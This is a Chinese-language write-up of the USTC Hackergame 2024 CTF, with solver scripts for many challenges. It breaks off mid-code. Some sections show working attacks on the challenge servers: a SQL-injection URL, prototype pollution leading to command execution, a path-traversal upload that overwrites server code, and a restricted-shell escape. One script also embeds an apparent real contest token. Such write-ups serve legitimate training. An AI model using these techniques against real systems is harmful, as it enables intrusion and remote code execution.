> 文章内容以 [此处的版本](https://benpigchu.github.io/pikanote/article/ustc-hackergame-2024-writeup.html) 为准，本仓库的版本为赛后直接提交的版本，之后若有修正可能不会在这边同步。
> 本文的协议为 [CC-BY-4.0](https://github.com/benpigchu/pikanote/blob/master/LICENSE)，与本仓库的默认协议（CC-BY-NC-SA-4.0）相比宽松一些。

# USTC Hackergame 2024 Writeup

一年一度的 USTC Hackergame 又开始了。今年的比赛再度比去年稍微晚了一些。和往年一样，今年也是每做一题就写一题的 Writeup，这样就不会因为比赛结束之后没有动力写而咕掉了。

以下按照解题时间顺序排序，有多个小题的，各小题分开排列。为了简单，题目本身的描述我就不写在 Writeup 里了，大家可以去 [官方 Writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups) 查看。

## 签到

和往年一样，输入速度挑战是否成功写在 URL search param 里了，所以我直接按照要求填入 true 即可。

不过显然也可以写一点 User Script 自动输入吧……

## 打不开的盒

直接打开 blender，用 boolean modifier 切一下就能看见内容了。

## 喜欢做签到的 CTFer 你们好呀 - Checkin Again & Again

找到 [对应的页面](https://www.nebuu.la/)，输入 `ls -a`，发现有个隐藏文件 `.flag`， 然后输入 `cat .flag` 即可获得。

## 喜欢做签到的 CTFer 你们好呀 - Checkin Again

输入 `env` 即可获得。怎么比第二小题后做出来呢？

## 无法获得的秘密

鉴于这个电脑是有 `python3` 的，所以我们可以写一些脚本进行一些处理。然后这个电脑是有 Firefox 的，所以我们可以生成 HTML 文件直接把数据画在 canvas 上。然而，由于颜色在传输过程中可能出现一些偏差（打开浏览器的开发者工具的网络一栏可以发现它在显示过程中至少有一步是过了一道 jpeg 编码的），所以最终我把每个字节画成两个像素，变成 512x2048 的图片，这样就算传输过程中出现小小的失真，也能恢复出正确的数据。

具体来说，首先我们手动用远程电脑上的 `vim` 创建这么一个脚本：

```py
with open("in.txt","rb") as fin:
	with open("out.html","w") as fout:
		data=fin.read()
		fout.write('<!DOCTYPE html><canvas id="a" width="512" height="2048"></canvas>')
		fout.write(f'<script>const data=[{",".join(str((c//16)*16)+","+str((c%16)*16) for c in data)}];') # 把数据灌进去，每个字节都分成高四位和低四位
		fout.write('const ctx=document.getElementById("a").getContext("2d");')
		fout.write('data.forEach((d,i)=>{ctx.fillStyle="#"+d.toString(16)+d.toString(16)+d.toString(16);ctx.fillRect(i%512,Math.floor(i/512),1,1)})</script>')
```

运行它之后，我们便可以获得一个 HTML 文件。用远程电脑上的 Firefox 打开之后，便可以看到表示文件内容的图像了。在浏览器的开发者工具里选中绘制屏幕的 `canvas` 元素，并在控制台运行以下代码，便可以把图片提取出来：

```js
document.body.append((()=>{a=new Image();a.src=$0.toDataURL();return a})())
```

最后在图像编辑软件里拼接好，就可以用以下脚本提取数据：

```py
from PIL import Image

with Image.open("data2.png") as im:
	with open("out.bin","wb") as fout:
		data=list(im.getdata())
		color=im.getpalette() # 我使用的 Paint.NET 是使用色板模式保存的，所以需要再从色板中获取真正的颜色
		result=[]
		for pix in data:
			result.append(round(color[pix*3]/16))
		for i in range(len(result)//2):
			fout.write((result[2*i]*16+result[2*i+1]).to_bytes())
```

这么早做这道题也是想要抢首杀。果然抢到了，好耶！

## 猫咪问答（Hackergame 十周年纪念版）

惯例的搜索引擎使用技巧考试。

- 对于第一题，通过 [LUG@USTC 上的 Hackergame介绍页](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/) 上名为 [第二届安全竞赛（存档）](https://lug.ustc.edu.cn/wiki/sec/contest.html) 的链接可以看到赛前讲座在前一天晚上于 3A204 教室举行。
- 对于第二题，翻一遍历年官方 Writeup（可以从 [去年的官方 Writeup 里找到链接](https://github.com/USTC-Hackergame/hackergame2023-writeups)）即可发现题目数量最接近 25 的是 2019 年，找到 [对应年份的新闻稿](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/) 即可得知注册人数为 2682 人。
- 对于第三题，[2018 年的官方 Writeup 中的花絮一页](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md) 写明了答案是《程序员的自我修养》
- 对于第四题，[中科大信息网络实验室的新闻页](https://if.ustc.edu.cn/news.php) 刊登了对应的论文被接收的消息。找到 [对应的论文](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf) 之后在第六章开头处即可找到答案是 336 种组合。至于为什么不是 16*20=320 种，论文中自有说明。
- 对于第五题，在 [lwn.net 对此事的报道](https://lwn.net/Articles/995186/) 中可以找到 [对应 commit 的链接](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf94)，由此可得答案是 `6e90b6`。
- 对于第六题，可以在 [网上找到的 Token 计数器](https://token-counter.app/meta/llama-3) 中计算。首次打开答题页面时的源代码可以用浏览器的无痕模式获取。然而这个网站的计算结果比实际值多 1，导致我穷举了本小题，赛后看官方题解才发现是有一个代表输入开头的 BOS token 是不计入的。

## 每日论文太多了！

打开论文搜索 flag，可以发现在 Figure 4 中 Semantic Space 这行下面有一行透明的 "Flag here" 文本。用 LibreOffice Draw 打开 PDF 之后去除对应位置的矩形即可看到图片中被遮挡的 flag。

## 比大小王

由于按按钮之后有一个后摇，并且服务端会检查用时，所以直接用脚本模拟点击是肯定过不去的。但是，模拟请求就能通过了。服务器还对提交时间进行了判断，如果太快提交就会被发现开挂，所以需要等待至少开场动画那么长的时间。代码如下：

```js
(async ()=>{
	const gameRespond=await fetch("http://202.38.93.141:12122/game", {
    "headers": {
      "accept": "*/*",
      "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5,ja-JP;q=0.4,ja;q=0.3",
      "cache-control": "no-cache",
      "content-type": "application/json",
      "pragma": "no-cache"
    },
    "referrer": "http://202.38.93.141:12122/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": "{}",
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  });//开始！
  const game=await gameRespond.json()
  await new Promise(res=>setTimeout(res,10000))
  await fetch("http://202.38.93.141:12122/submit", {
    "headers": {
      "accept": "*/*",
      "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5,ja-JP;q=0.4,ja;q=0.3",
      "cache-control": "no-cache",
      "content-type": "application/json",
      "pragma": "no-cache"
    },
    "referrer": "http://202.38.93.141:12122/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": JSON.stringify({
      inputs:game.values.map(([a,b])=>a>b?">":"<")
    }),
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  });//提交
})()
```

## Node.js is Web Scale

鉴于它没有用 Map 来存数据，那么我们只需要利用 `__proto__` 就可以改写读取 `cmd` 上的命令时的行为。首先我们设置 `__proto__.ls` 为 `ls`，再访问 `/execute?cmd=ls` 便可以得到 `ls` 命令的运行结果。用类似的方法这样我们可以运行任意命令。运行 `ls /` 后可以发现根目录下有 `flag` 文件，再运行 `cat /flag` 即可获得 flag。

## PaoluGPT - 千里挑一

直接访问所有页面上的链接就可以找到哪一个含有 flag。以下为自动遍历脚本：

```js
(async ()=>{
  const links=[...document.querySelectorAll("li a")].map(e=>e.href)
	for (const link of links) {
    const respond=await fetch(link)
    const html=await respond.text()
    if(html.includes("flag")){
      console.log(link)
    }
  }
})()
```

找到之后拉到页面结尾即可获得 flag。

## PaoluGPT - 窥视未知

打开服务端源代码，立即发现可以 sql 注入。那么直接访问以下地址：

```
https://chal01-mdiohoe9.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=%27%20or%20shown%20=%20false--
```

这样拼出来的 sql 就是
```sql
select title, contents from messages where id = '' or shown = false--'
```

这样就能找到隐藏的数据条目了。找到之后拉到页面结尾即可获得 flag。

## 旅行照片 4.0 - LEO_CHAN?

惯例的图寻题。直接搜索图片上的文字可以找到 [对应的地址](https://j.map.baidu.com/24/Ghzg)，再搜索中科大校门，可得是东校区西门最近。至于 Leo 酱的事情，可以直接搜索到她的 B 站账号，找到 [对应的动态](https://www.bilibili.com/opus/930934582351495204) 就可以得知是 2024 年 5 月 19 日。

## 旅行照片 4.0 - FULL_RECALL

观察第一张图片的垃圾桶上可知这是六安市，搜索“六安公园红黄蓝”可以得到 [这篇宣传文章](https://www.sohu.com/a/498872898_100023473)，所以是中央公园。而第二张图片直接以图搜图可以得到这是宜昌的坛子岭景区，[有文章为证](https://blog.sciencenet.cn/blog-264137-1027498.html)。

## 旅行照片 4.0 - OMINOUS_BELL

直接搜索“粉色动车组”可以知道左下角的列车是怀柔－密云线上的 CRH6F-A 型电力动车组，其所在的线路有 [维基百科条目](https://zh.wikipedia.org/wiki/%E5%8C%97%E4%BA%AC%E5%B8%82%E9%83%8A%E9%93%81%E8%B7%AF%E6%80%80%E6%9F%94%E2%80%94%E5%AF%86%E4%BA%91%E7%BA%BF)。在 B 站上搜索此线路的运转视频，可以得知图片位置为 [北京北动车运用所](https://j.map.baidu.com/a7/lEU)，在此处搜索医院即可得知最近的医院是积水潭医院。

## 不宽的宽字符

这样肯定不工作啊，因为你把宽字符串的数据当作窄字符串来使用了。本地随机测试一下就会发现，如果输入 `a`，那么就会正常打开 `a` 文件，因为输入变成宽字符串之后加上右面的内容，再当作窄字符串使用的话，开头两个字符就是 `a` 和 `\0`，自然就会打开 `a` 文件。想必小 A 随便找的文件名就是单个字母吧。

这样我们只需要让输入的文件名转为 UTF-16 之后再转为字节时开头是 `Z:\theflag` 后面跟一个 `\0` 就好。要做到这一点，我们只需要把每两个字节的数据塞进一个 UTF-16 字符，再把结果转换为 UTF-8 编码就好。代码如下：

```py
import pwn

token=b"<token>"

conn = pwn.remote('202.38.93.141',14202)
conn.send(token)
conn.send(b"\n")

conn.recvuntil(b"it:")
conn.recvuntil(b"\n")
data=b"Z:\\theflag\0!"
filename="".join(chr(data[2*i]+256*data[2*i+1]) for i in range(len(data)//2)) # 二合一编码

conn.send(filename.encode())
conn.interactive()
```

## PowerfulShell

先来研究一下还有什么符号可以用，结果是:

```
~`$-_=+[]{}|:
123456789
```

那么用这些符号可以做些什么呢？首先我们可以定义任意多的变量，因为可以用 `_` 制造变量名，并用 `=` 定义内容。其次我们可以用 `~` 获得家目录路径，并用 `$-` 获得 Shell 的选项。而这两个字符串分别是 `/Players` 和 `hB`，而取子字符串的语法 `${__:1:2}` 刚好也可以用，所以我们就可以从这两个字符串里提取出 `sh`，从而逃逸到真正的 shell 里。具体命令如下：

```bash
__=~
__=$__$-
${__:7:2}
```

之后就可以直接使用 `cat /flag` 获取 flag 了。

## 强大的正则表达式 - Easy

众所周知，十进制整数能被 16 整除等效于结尾四位可以被 16 整除，所以我们只需要匹配结尾四位就好。代码如下：

```py
import pwn

token=b"<token>"

conn = pwn.remote('202.38.93.141',30303)
conn.send(token)
conn.send(b"\n")

conn.recvuntil(b"(1~3): ")
conn.send(b"1\n")
conn.recvuntil(b"regex: ")

regex="(0|1|2|3|4|5|6|7|8|9)*("+"|".join(str(i).zfill(4) for i in range(0,10000,16))+")"
conn.send(regex.encode())
conn.send(b"\n")
conn.interactive()
```

注意我没有处理小于 10000 的情况，不过由于数据范围，这种情况几乎不会发生。

## 强大的正则表达式 - Medium

众所周知，字符串形式的整数对常数求模是可以用有限状态机来实现的。我们让状态代表当前的余数，由于余数可以由去掉最后一位的余数和最后一位唯一确定，所以可以直接得到状态转移规则。有限状态机构建出来之后，直接按照标准的方式一步步擦除状态，就可以把有限状态机转换为对应的正则表达式。代码如下：

```py
import pwn

token=b"<token>"

conn = pwn.remote('202.38.93.141',30303)
conn.send(token)
conn.send(b"\n")

import pwn

token=b"122:MEYCIQCQBLSYP3hXWkDfJqyt1TC9YpQlIz2cTyBQwQCevhNr3wIhAMIVII2AE8pe/M52Hvd5kflNs8CYs1oCr2vSdY3V7wjC"

conn = pwn.remote('202.38.93.141',30303)
conn.send(token)
conn.send(b"\n")

conn.recvuntil(b"(1~3): ")
conn.send(b"2\n")
conn.recvuntil(b"regex: ")

n=13
paths=[[[] for _ in range(n)] for _ in range(n)]

# 构建状态转移矩阵
for i in range(n):
	paths[i][(2*i)%n].append("0")
	paths[i][(2*i+1)%n].append("1")

def path_union(list):
	return "("+"|".join(list)+")"

state_count=n
while state_count>1:
	target=state_count-1
	loop=""
	if len(paths[target][target])>0:
		loop=path_union(paths[target][target])+"*"
	# 擦除状态后重写相关的边
	for i in range(target):
		for j in range(target):
			if len(paths[i][target])>0 and len(paths[target][j])>0:
				paths[i][j].append(path_union(paths[i][target])+loop+path_union(paths[target][j]))
	state_count-=1


regex=path_union(paths[0][0])+"*"

conn.send(regex.encode())
conn.send(b"\n")
conn.interactive()
```

## 强大的正则表达式 - Hard

鉴于 CRC 本质上是多项式除法，所以同样可以得到对应的有限状态机，再转换为正则表达式。然而，由于和上一小题略有区别的是，初始状态为 7 与终止状态 0 不同，这使得我们的生成代码也需要略加修改。代码如下：

```py
import pwn
import libscrc

token=b"<token>"

conn = pwn.remote('202.38.93.141',30303)
conn.send(token)
conn.send(b"\n")

conn.recvuntil(b"(1~3): ")
conn.send(b"3\n")
conn.recvuntil(b"regex: ")

paths=[[set() for _ in range(8)] for _ in range(8)]

# 构建状态转移矩阵
for i in "0123456789":
	for j in "0123456789":
		paths[libscrc.gsm3(i.encode())][libscrc.gsm3((i+j).encode())].add(str(j))

def path_union(list):
	return "("+"|".join(list)+")"

states=[0,7,6,5,4,3,2,1]
state_count=8
while state_count>2:
	target=states[state_count-1]
	loop=""
	if len(paths[target][target])>0:
		loop=path_union(paths[target][target])+"*"
	# 擦除状态后重写相关的边
	for i in states[:state_count-1]:
		for j in states[:state_count-1]:
			if len(paths[i][target])>0 and len(paths[target][j])>0:
				paths[i][j].add(path_union(paths[i][target])+loop+path_union(paths[target][j]))
	state_count-=1

# 最后剩下起始和结束状态时手动拼接
regex=path_union([
	path_union(paths[7][7]),
	path_union(paths[7][0])+path_union(paths[0][0])+"*"+path_union(paths[0][7])
])+"*"+path_union(paths[7][0])+path_union(paths[0][0])+"*"

conn.send(regex.encode())
conn.send(b"\n")
conn.interactive()
```

## 惜字如金 3.0 - 题目 A

只需读代码补全 e 和重复字母就好。需要注意的是，所有文本文件在惜字如金化前均使用空格将每行填充到了 80 个字符。这意味着我们提交之前需要需要写脚本填充空格。填充脚本如下：

```js
const fs=require("fs")

const content=fs.readFileSync("./xzrj/answer_c.py","utf-8")

fs.writeFileSync("./xzrj/answer_c_fill.py",content.split("\n").map(l=>l.trimEnd().padEnd(80," ")).join("\n"))
```

## 优雅的不等式 - Easy

找到 [知乎上有关的答案](https://www.zhihu.com/question/64996263/answer/228167441)，找到结尾证明圆周率大于 333/106 的公式，然后把它与 8/3 的差补上即可。也就是说，只需要提交 `x**5*(1-x)**6*(197+462*x**2)/(1+x**2)/530+151/318` 就可以了。

## 惜字如金 3.0 - 题目 B

这里我们需要补全第 7 行的多项式配置。注意到需要补全的代码就是判题的服务器代码，而不匹配时服务端会返回我们的输入经过 `hash` 函数返回的结果，我们可以据此推测具体是什么多项式。首先我们提交一行内容为 `\xFF\xFF\xFF\xFF\xFF\x7F` 的字符串，这样 `crc` 函数返回的结果就直接是 `flip ^ (1 << 48) - 1` 了。而我们只需要解一个二次同余方程就可以得到 `crc` 函数返回的结果。由于同余方程的模是 2 的幂，我们只需从低位到高位逐个穷举就好。由于同余方程有两个解，我们还需要用以另一个 `hash` 函数的结果来验证哪一个是正确的，代码如下：

```py
u2, u1, u0 = 241818181881667, 279270832074457, 202208575380941

result = int.from_bytes(bytes.fromhex("d77759699022"),"little") # b"\xFF\xFF\xFF\xFF\xFF\x7F" 的返回结果

values=[0]
for bit in range(48):
	new_values=[]
	for v in values:
		if (v * (v * u2 + u1) + u0) % (1 << (bit+1)) == result % (1 << (bit+1)):
			new_values.append(v)
		if ((v+(1<<bit)) * ((v+(1<<bit)) * u2 + u1) + u0) % (1 << (bit+1)) == result % (1 << (bit+1)):
			new_values.append(v+(1<<bit))
	values=new_values

def crc(input: bytes,flip) -> int:
    poly_degree =  48
    digest = (1 << poly_degree) - 1
    for b in input:
        digest = digest ^ b
        for _ in range(8):
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)
    return digest ^ (1 << poly_degree) - 1

def hash(input: bytes,flip) -> bytes:
    digest = crc(input,flip)
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd
    assert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)
    return digest.to_bytes(48 // 8, 'little')

flips=[]
for v in values:
      flip=v ^ (1 << 48) - 1
      print(v,hash(b"a",flip).hex(),hash(b"",flip).hex())
      if hash(b"a",flip).hex()=="5f11989062ad": # a 的返回结果
            flips.append(flip)

flip=flips[0]

print("".join(['b', 'B'][(flip>>i)&1] for i in range(48)))
```

还原之后填回去再像上一个小题一样补空格就能得到 flag。

## 禁止内卷

既然都开 `--reload` 了，自然是要想办法覆盖服务端源码。由于上传文件时服务端直接 `join` 路径了，那我上传一个 `../web/app.py` 文件就可以直接覆盖服务端源码。由于正常通过浏览器上传无法让文件名带斜杠，我们需要写脚本上传。代码如下

```js
code=`
from flask import Flask, render_template, request, flash, redirect
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

@app.route("/", methods=["GET"])
def index():
    with open("answers.json") as f:
        return f.read()
`
fetch("/submit", {
    "body": (()=>{const data = new FormData();data.append('file',new File([code],"../web/app.py"));return data})(),
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
  });
```

完成后刷新就能看到原始答案文件了，之后执行如下代码就能提取 flag：
```js
JSON.parse(document.body.innerText).map(n=>String.fromCharCode(n+65)).join("")
```

## 零知识数独 - 数独高手

为什么要有这一小题？为什么要我随便找个在线 solver 做苦力？

顺带一提，我用的是 [f-puzzles](https://www.f-puzzles.com/) 附带的 solver。

## 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」 - 「行吧就算标题可以很长但是 flag 一定要短点」

本题目不需要任何 AI 知识。只需要借助 [Nutrimatic 找词工具](https://nutrimatic.org/) 的力量，你就能完全还原原文。对于一些比较不熟悉的用法也可以通过搜索连续的多个词来确定。

## 关灯 -  Easy/Medium/Hard

这我肯定用 z3 硬解。代码如下：

```py
import pwn
import z3

token=b"<token>"

conn = pwn.remote('202.38.93.141',10098)
conn.send(token)
conn.send(b"\n")

n_list=[3,5,11]
difficulty=3
n=n_list[difficulty-1]

conn.recvuntil(b"(1~4): ")
conn.send(str(difficulty).encode()+b"\n")
data=conn.recvuntil(b"\n").decode().strip()
print(data)

s = z3.Solver()

var=[[[z3.Bool(f"switch_{i}_{j}_{k}") for i in range(n)] for j in range(n)] for k in range(n)]

directions=[
	(0,0,1),
	(0,0,-1),
	(0,1,0),
	(0,-1,0),
	(1,0,0),
	(-1,0,0),
]

for k in range(n):
	for j in range(n):
		for i in range(n):
			val=var[k][j][i]
			for di,dj,dk in directions:
				ni=i+di
				nj=j+dj
				nk=k+dk
				if all(map(lambda p:p>=0 and p<n,(ni,nj,nk))):
					val=z3.Xor(val,var[nk][nj][ni])
			s.add(val==(data[i+n*j+n*n*k]=="1"))


print(s.check())
m=s.model()

ans=""
for k in range(n):
	for j in range(n):
		for i in range(n):
			val=m.evaluate(var[k][j][i])
			ans+="1" if val else "0"
			print(val)

print(ans)

conn.recvuntil(b"answer: ")
conn.send(ans.encode()+b"\n")

conn.interactive()
```

不过最终 flag 似乎完全没有提到过 z3 或者 SAT solver，虽然用这种方法并不能解决最后一小题……

## 零知识数独 - ZK 高手

虽然上一小题教大家做数独实在是没有道理，这一小题教大家用 `snarkjs` 搞零知识证明还是挺好的。通读 [snarkjs 的指引文档](https://github.com/iden3/snarkjs)，去掉出题人已经做了的部分之后，我们实际上只需要解出数独，把数独的结果放到 `input.json` 中，然后运行以下命令：

```sh
snarkjs wtns calculate sudoku.wasm input.json witness.wtns
snarkjs groth16 prove sudoku.zkey witness.wtns proof.json public.json
snarkjs groth16 verify verification_key.json public.json proof.json
```

这样我们便能获得需要提交的 `proof.json` 文件，并如题面所写的一样对其进行验证。 `input.json` 的格式如下所示：

```json
{
	"unsolved_grid":[
		"0","0","0","0","0","5","6","0","8",
		"0","4","0","0","6","0","0","1","0",
		"5","0","0","0","0","0","0","0","0",
		"0","0","1","0","0","0","0","3","0",
		"0","0","6","2","0","0","9","0","0",
		"0","0","0","9","0","1","0","8","0",
		"3","9","2","8","0","0","0","0","0",
		"0","0","0","0","0","0","0","0","5",
		"0","7","0","0","2","0","0","0","3"
	],
	"solved_grid":[
		"1","2","3","4","9","5","6","7","8",
		"7","4","8","3","6","2","5","1","9",
		"5","6","9","7","1","8","3","2","4",
		"9","8","1","5","4","6","7","3","2",
		"4","3","6","2","8","7","9","5","1",
		"2","5","7","9","3","1","4","8","6",
		"3","9","2","8","5","4","1","6","7",
		"8","1","4","6","7","3","2","9","5",
		"6","7","5","1","2","9","8","4","3"
	]
}
```

提交 `proof.json` 文件即可获得 flag。

## RISC-V：虎胆龙威 - 警告：易碎 / Fragility

这应该是三个小题里面最简单的了。首先由于我们 RISC-V 的寄存器有 32 个这么多，所以我们完全可以在寄存器里排序。其次由于我们不能读两遍同一地址，所以我们没法循环，但是我们把循环展开就好了。那么这就很适合使用排序网络来排序了，我们只需要写一些代码来生成汇编就好了。为了减少内存占用，我找了一下 [目前已知最小的 16 元素排序网络](https://bertdobbelaere.github.io/sorting_networks.html#N16L60D10)。代码如下：

```js
console.log(".section .text")
console.log("_start:")

const hex=i=>"0x"+i.toString(16)
const allocateLabel=(()=>{
	let last=0
	return ()=>{
		const next=last+1
		last=next
		return `L${next}`
	}
})()


const genInst=(inst)=>console.log(`    ${inst}`)

// 读进寄存器
genInst(`li x17,${hex(0xf80)}`)
for(let i=0;i<16;i++){
	genInst(`lw x${i+1},${4*i}(x17)`)
}

// 生成比较和交换
const sortPair=(i,j)=>{
	const label=allocateLabel()
	genInst(`bltu x${i+1}, x${j+1}, ${label}`)
	genInst(`mv x17, x${i+1}`)
	genInst(`mv x${i+1}, x${j+1}`)
	genInst(`mv x${j+1}, x17`)
	console.log(`${label}:`)
}

const sortNetwork=[[[0,13],[1,12],[2,15],[3,14],[4,8],[5,6],[7,11],[9,10]],
[[0,5],[1,7],[2,9],[3,4],[6,13],[8,14],[10,15],[11,12]],
[[0,1],[2,3],[4,5],[6,8],[7,9],[10,11],[12,13],[14,15]],
[[0,2],[1,3],[4,10],[5,11],[6,7],[8,9],[12,14],[13,15]],
[[1,2],[3,12],[4,6],[5,7],[8,10],[9,11],[13,14]],
[[1,4],[2,6],[5,8],[7,10],[9,13],[11,14]],
[[2,4],[3,6],[9,12],[11,13]],
[[3,5],[6,8],[7,9],[10,12]],
[[3,4],[5,6],[7,8],[9,10],[11,12]],
[[6,7],[8,9]]]

for(const layer of sortNetwork){
	for(const [i,j] of layer){
		sortPair(i,j)
	}
}

// 移动到输出
genInst(`li x17,${hex(0xfc0)}`)
for(let i=0;i<16;i++){
	genInst(`sw x${i+1},${4*i}(x17)`)
}
```

## 不太分布式的软总线 - What DBus Gonna Do?

鉴于可以提交 sh 脚本，并且环境里有 `dbus-bin` 这个包，所以我们可以直接用 [`dbus-send` 命令](https://dbus.freedesktop.org/doc/dbus-send.1.html) 来发起命令提交 DBus 请求。代码如下：

```sh
#!/bin/bash
dbus-send --system --dest=cn.edu.ustc.lug.hack.FlagService \
	--print-reply \
	/cn/edu/ustc/lug/hack/FlagService \
	cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
	string:'Please give me flag1'
```

## 不太分布式的软总线 - If I Could Be A File Descriptor

由于 `dbus-send` 无法帮助我们传递文件描述符，我们需要写一点 C。好在题目文件里的 `getflag3` 可以当作示例使用。查询一下 GIO 的文档可以发现，在我们的实例中示例的 [`g_dbus_connection_call`](https://docs.gtk.org/gio/method.DBusConnection.call.html) 旁边有个类似的[`g_dbus_connection_call_with_unix_fd_list_sync`](https://docs.gtk.org/gio/method.DBusConnection.call_with_unix_fd_list.html) 可以帮我们传递文件描述符。那么我们只需要建一对 `pipefd`，在写入端写入所需的字符，再把读取端包到 `GUnixFDList` 里面发过去就好。代码如下：

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag2"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;

  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  // 创建管道
  int pipefd[2];
  int pipe2result=pipe2(pipefd,0);
  if(pipe2result<0){
    perror("pipe2");
    exit(-1);
  }
  char* message="Please give me flag2\n";
  ssize_t length=22;
  ssize_t written=0;
  while(written<length){
    ssize_t len = write(pipefd[1],message+written,length-written);
    if(len<0){
      perror("write");
      exit(-1);
    }
    written+=len;
  }
  close(pipefd[1]);

  // 塞进 GUnixFDList
  GUnixFDList *fd_list;

  fd_list = g_unix_fd_list_new ();
  error = NULL;
  g_unix_fd_list_append (fd_list, pipefd[0], &error);
  g_assert_no_error (error);

  // 发送请求
  result = g_dbus_connection_call_with_unix_fd_list_sync( connection,
                                                          DEST,
                                                          OBJECT_PATH,
                                                          INTERFACE,
                                                          METHOD,
                                                          g_variant_new("(h)", 0),
                                                          NULL,
                                                          G_DBUS_CALL_FLAGS_NONE,
                                                          -1,
                                                          fd_list,
                                                          NULL,
                                                          NULL, &error);

  if (result) {
	gchar *str;
	g_variant_get (result, "(s)", &str);
    g_print(str);
    g_variant_unref(result);
  } else {
    g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
    g_error_free(error);
  }

  g_object_unref(connection);

  return EXIT_SUCCESS;
}
```

## 不太分布式的软总线 - Comm Say Maybe

直接把 `getflag3` 写入到 `/proc/self/comm` 即可。代码如下：

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;

  int commfd=open("/proc/self/comm",O_RDWR);
  if(commfd<0){
    perror("open comm");
    exit(-1);
  }
  char* message="getflag3";
  ssize_t length=8;
  ssize_t written=0;
  while(written<length){
    ssize_t len = write(commfd,message+written,length-written);
    if(len<0){
      perror("write");
      exit(-1);
    }
    written+=len;
  }
  ftruncate(commfd,8);
  close(commfd);

  char path[1024];
  g_snprintf(path, sizeof(path), "/proc/self/comm");
  gchar *comm;
  gsize len;
  if (g_file_get_contents(path, &comm, &len, &error)) {
    g_print(comm);
  } else {
    g_printerr("Failed to read comm: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  // 发送请求
  result = g_dbus_connection_call_sync(connection,
                                       DEST,
                                       OBJECT_PATH,
                                       INTERFACE,
                                       METHOD,
                                       NULL,
                                       NULL,
                                       G_DBUS_CALL_FLAGS_NONE,
                                       -1,
                                       NULL, &error);

  if (result) {
	gchar *str;
	g_variant_get (result, "(s)", &str);
    g_print(str);
    g_variant_unref(result);
  } else {
    g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
    g_error_free(error);
  }

  g_object_unref(connection);

  return EXIT_SUCCESS;
}
```

## 看不见的彼方：交换空间 - 小菜一碟

想必看过往年题解（也就是题目内的那个链接）的都知道，我们可以用信号和 IPC 来传递数据。而这个 IPC 指的就是消息队列（[`msgget`](https://man7.org/linux/man-pages/man2/msgget.2.html) 等）和共享内存（[`shmget`](https://man7.org/linux/man-pages/man2/shmget.2.html) 等）。注意一定要使用 System V 口味的 API，因为 posix 口味的那几个会依赖文件系统而不能使用。进程间通信的问题解决了，接下来就是内存限制的处理了。虽然不能完全复制，但是一次复制个 2MiB 还是没问题的。我们开一个 2MiB 大小的共享内存空间，然后前半部分用来把 A 的文件内容传给 B，后半部分用来把 B 的文件内容传给 A，写入到文件的时候直接原位置覆盖写入即可。每次传递两个 1MiB 大小的文件片段，再加上用消息队列跨进程同步，整个事情就成了。

Alice 的代码如下：
```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/shm.h>

void perror_exit(char* message){
	perror(message);
	exit(-1);
}

struct message {
    long type;
    char buffer[4];
};

int main()
{
	printf("a start\n");
	int mqab=msgget(12450,0666 |IPC_CREAT);
	if(mqab<0){
		perror_exit("msgget swapab error");
	}
	int mqba=msgget(12451,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("msgget swapba error");
	}
	int shm=shmget(12452,2*1024*1024,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("shmget error");
	}
	void* mem=shmat(shm,0,0);
	if(mem==(void*)(-1)){
		perror_exit("shmat error");
	}
